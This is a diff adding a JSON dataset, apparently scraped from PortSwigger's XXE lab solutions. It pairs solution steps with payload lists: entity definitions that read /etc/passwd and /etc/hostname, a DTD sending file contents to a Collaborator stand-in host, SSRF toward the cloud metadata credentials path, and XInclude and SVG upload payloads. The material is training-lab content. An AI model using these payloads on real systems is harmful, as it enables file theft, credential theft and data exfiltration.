@@ -1,0 +1,164 @@
+[
+  {
+    "url": "https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd",
+    "category": "xxe",
+    "title": "Exploiting XXE to retrieve data by repurposing a local DTD",
+    "description": "This lab has a \"Check stock\" feature that parses XML input but does not display the result.",
+    "solution_steps": [
+      "Visit a product page, click \"Check stock\", and intercept the resulting POST request in Burp Suite.",
+      "Insert the following parameter entity definition in between the XML declaration and the stockCheck element: <!DOCTYPE message [\n<!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\">\n<!ENTITY % ISOamso '\n<!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\">\n<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\">\n&#x25;eval;\n&#x25;error;\n'>\n%local_dtd;\n]> This will import the Yelp DTD, then redefine the ISOamso entity, triggering an error message containing the contents of the /etc/passwd file."
+    ],
+    "solution": "1. Visit a product page, click \"Check stock\", and intercept the resulting POST request in Burp Suite.\n2. Insert the following parameter entity definition in between the XML declaration and the stockCheck element: <!DOCTYPE message [\n<!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\">\n<!ENTITY % ISOamso '\n<!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\">\n<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\">\n&#x25;eval;\n&#x25;error;\n'>\n%local_dtd;\n]> This will import the Yelp DTD, then redefine the ISOamso entity, triggering an error message containing the contents of the /etc/passwd file.",
+    "payloads": [
+      "/etc/passwd",
+      "/usr/share/yelp/dtd/docbookx.dtd",
+      "ISOamso.",
+      "stockCheck",
+      "<!DOCTYPE message [\n<!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\">\n<!ENTITY % ISOamso '\n<!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\">\n<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\">\n&#x25;eval;\n&#x25;error;\n'>\n%local_dtd;\n]>",
+      "ISOamso"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages",
+    "category": "xxe",
+    "title": "Exploiting blind XXE to retrieve data via error messages",
+    "description": "This lab has a \"Check stock\" feature that parses XML input but does not display the result.",
+    "solution_steps": [
+      "Click \"Go to exploit server\" and save the following malicious DTD file on your server: <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>\">\n%eval;\n%exfil; When imported, this page will read the contents of /etc/passwd into the file entity, and then try to use that entity in a file path.",
+      "Click \"View exploit\" and take a note of the URL for your malicious DTD.",
+      "You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click \"Check stock\", and intercept the resulting POST request in Burp Suite.",
+      "Insert the following external entity definition in between the XML declaration and the stockCheck element: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"YOUR-DTD-URL\"> %xxe;]> You should see an error message containing the contents of the /etc/passwd file."
+    ],
+    "solution": "1. Click \"Go to exploit server\" and save the following malicious DTD file on your server: <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>\">\n%eval;\n%exfil; When imported, this page will read the contents of /etc/passwd into the file entity, and then try to use that entity in a file path.\n2. Click \"View exploit\" and take a note of the URL for your malicious DTD.\n3. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click \"Check stock\", and intercept the resulting POST request in Burp Suite.\n4. Insert the following external entity definition in between the XML declaration and the stockCheck element: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"YOUR-DTD-URL\"> %xxe;]> You should see an error message containing the contents of the /etc/passwd file.",
+    "payloads": [
+      "/etc/passwd",
+      "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>\">\n%eval;\n%exfil;",
+      "file",
+      "stockCheck",
+      "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"YOUR-DTD-URL\"> %xxe;]>"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration",
+    "category": "xxe",
+    "title": "Exploiting blind XXE to exfiltrate data using a malicious external DTD",
+    "description": "This lab has a \"Check stock\" feature that parses XML input but does not display the result.",
+    "solution_steps": [
+      "Using Burp Suite Professional, go to the Collaborator tab.",
+      "Click \"Copy to clipboard\" to copy a unique Burp Collaborator payload to your clipboard.",
+      "Place the Burp Collaborator payload into a malicious DTD file: <!ENTITY % file SYSTEM \"file:///etc/hostname\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>\">\n%eval;\n%exfil;",
+      "Click \"Go to exploit server\" and save the malicious DTD file on your server. Click \"View exploit\" and take a note of the URL.",
+      "You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click \"Check stock\", and intercept the resulting POST request in Burp Suite.",
+      "Insert the following external entity definition in between the XML declaration and the stockCheck element: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"YOUR-DTD-URL\"> %xxe;]>",
+      "Go back to the Collaborator tab, and click \"Poll now\". If you don't see any interactions listed, wait a few seconds and try again.",
+      "You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The HTTP interaction could contain the contents of the /etc/hostname file."
+    ],
+    "solution": "1. Using Burp Suite Professional, go to the Collaborator tab.\n2. Click \"Copy to clipboard\" to copy a unique Burp Collaborator payload to your clipboard.\n3. Place the Burp Collaborator payload into a malicious DTD file: <!ENTITY % file SYSTEM \"file:///etc/hostname\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>\">\n%eval;\n%exfil;\n4. Click \"Go to exploit server\" and save the malicious DTD file on your server. Click \"View exploit\" and take a note of the URL.\n5. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click \"Check stock\", and intercept the resulting POST request in Burp Suite.\n6. Insert the following external entity definition in between the XML declaration and the stockCheck element: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"YOUR-DTD-URL\"> %xxe;]>\n7. Go back to the Collaborator tab, and click \"Poll now\". If you don't see any interactions listed, wait a few seconds and try again.\n8. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The HTTP interaction could contain the contents of the /etc/hostname file.",
+    "payloads": [
+      "/etc/hostname",
+      "<!ENTITY % file SYSTEM \"file:///etc/hostname\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>\">\n%eval;\n%exfil;",
+      "stockCheck",
+      "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"YOUR-DTD-URL\"> %xxe;]>"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction",
+    "category": "xxe",
+    "title": "Blind XXE with out-of-band interaction",
+    "description": "This lab has a \"Check stock\" feature that parses XML input but does not display the result.",
+    "solution_steps": [
+      "Visit a product page, click \"Check stock\" and intercept the resulting POST request in Burp Suite Professional.",
+      "Insert the following external entity definition in between the XML declaration and the stockCheck element. Right-click and select \"Insert Collaborator payload\" to insert a Burp Collaborator subdomain where indicated: <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN\"> ]>",
+      "Replace the productId number with a reference to the external entity: &xxe;",
+      "Go to the Collaborator tab, and click \"Poll now\". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload."
+    ],
+    "solution": "1. Visit a product page, click \"Check stock\" and intercept the resulting POST request in Burp Suite Professional.\n2. Insert the following external entity definition in between the XML declaration and the stockCheck element. Right-click and select \"Insert Collaborator payload\" to insert a Burp Collaborator subdomain where indicated: <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN\"> ]>\n3. Replace the productId number with a reference to the external entity: &xxe;\n4. Go to the Collaborator tab, and click \"Poll now\". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.",
+    "payloads": [
+      "stockCheck",
+      "<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN\"> ]>",
+      "productId",
+      "&xxe;"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities",
+    "category": "xxe",
+    "title": "Blind XXE with out-of-band interaction via XML parameter entities",
+    "description": "This lab has a \"Check stock\" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.",
+    "solution_steps": [
+      "Visit a product page, click \"Check stock\" and intercept the resulting POST request in Burp Suite Professional.",
+      "Insert the following external entity definition in between the XML declaration and the stockCheck element. Right-click and select \"Insert Collaborator payload\" to insert a Burp Collaborator subdomain where indicated: <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN\"> %xxe; ]>",
+      "Go to the Collaborator tab, and click \"Poll now\". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload."
+    ],
+    "solution": "1. Visit a product page, click \"Check stock\" and intercept the resulting POST request in Burp Suite Professional.\n2. Insert the following external entity definition in between the XML declaration and the stockCheck element. Right-click and select \"Insert Collaborator payload\" to insert a Burp Collaborator subdomain where indicated: <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN\"> %xxe; ]>\n3. Go to the Collaborator tab, and click \"Poll now\". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.",
+    "payloads": [
+      "stockCheck",
+      "<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN\"> %xxe; ]>"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf",
+    "category": "xxe",
+    "title": "Exploiting XXE to perform SSRF attacks",
+    "description": "This lab has a \"Check stock\" feature that parses XML input and returns any unexpected values in the response.",
+    "solution_steps": [
+      "Visit a product page, click \"Check stock\", and intercept the resulting POST request in Burp Suite.",
+      "Insert the following external entity definition in between the XML declaration and the stockCheck element: <!DOCTYPE test [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/\"> ]>",
+      "Replace the productId number with a reference to the external entity: &xxe; . The response should contain \"Invalid product ID:\" followed by the response from the metadata endpoint, which will initially be a folder name.",
+      "Iteratively update the URL in the DTD to explore the API until you reach /latest/meta-data/iam/security-credentials/admin . This should return JSON containing the SecretAccessKey ."
+    ],
+    "solution": "1. Visit a product page, click \"Check stock\", and intercept the resulting POST request in Burp Suite.\n2. Insert the following external entity definition in between the XML declaration and the stockCheck element: <!DOCTYPE test [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/\"> ]>\n3. Replace the productId number with a reference to the external entity: &xxe; . The response should contain \"Invalid product ID:\" followed by the response from the metadata endpoint, which will initially be a folder name.\n4. Iteratively update the URL in the DTD to explore the API until you reach /latest/meta-data/iam/security-credentials/admin . This should return JSON containing the SecretAccessKey .",
+    "payloads": [
+      "http://169.254.169.254/",
+      "stockCheck",
+      "<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/\"> ]>",
+      "productId",
+      "&xxe;",
+      "/latest/meta-data/iam/security-credentials/admin",
+      "SecretAccessKey"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files",
+    "category": "xxe",
+    "title": "Exploiting XXE using external entities to retrieve files",
+    "description": "This lab has a \"Check stock\" feature that parses XML input and returns any unexpected values in the response.",
+    "solution_steps": [
+      "Visit a product page, click \"Check stock\", and intercept the resulting POST request in Burp Suite.",
+      "Insert the following external entity definition in between the XML declaration and the stockCheck element: <!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>",
+      "Replace the productId number with a reference to the external entity: &xxe; . The response should contain \"Invalid product ID:\" followed by the contents of the /etc/passwd file."
+    ],
+    "solution": "1. Visit a product page, click \"Check stock\", and intercept the resulting POST request in Burp Suite.\n2. Insert the following external entity definition in between the XML declaration and the stockCheck element: <!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n3. Replace the productId number with a reference to the external entity: &xxe; . The response should contain \"Invalid product ID:\" followed by the contents of the /etc/passwd file.",
+    "payloads": [
+      "/etc/passwd",
+      "stockCheck",
+      "<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>",
+      "productId",
+      "&xxe;"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/xxe/lab-xinclude-attack",
+    "category": "xxe",
+    "title": "Exploiting XInclude to retrieve files",
+    "description": "This lab has a \"Check stock\" feature that embeds the user input inside a server-side XML document that is subsequently parsed.",
+    "solution": "By default,\nXInclude\nwill try to parse the included document as XML. Since\n/etc/passwd\nisn't valid XML, you will need to add an extra attribute to the\nXInclude\ndirective to change this behavior.",
+    "payloads": [
+      "XInclude",
+      "/etc/passwd",
+      "productId",
+      "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload",
+    "category": "xxe",
+    "title": "Exploiting XXE via image file upload",
+    "description": "This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.",
+    "solution": "The SVG image format uses XML.",
+    "payloads": [
+      "/etc/hostname",
+      "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]><svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"><text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text></svg>"
+    ]
+  }
+]
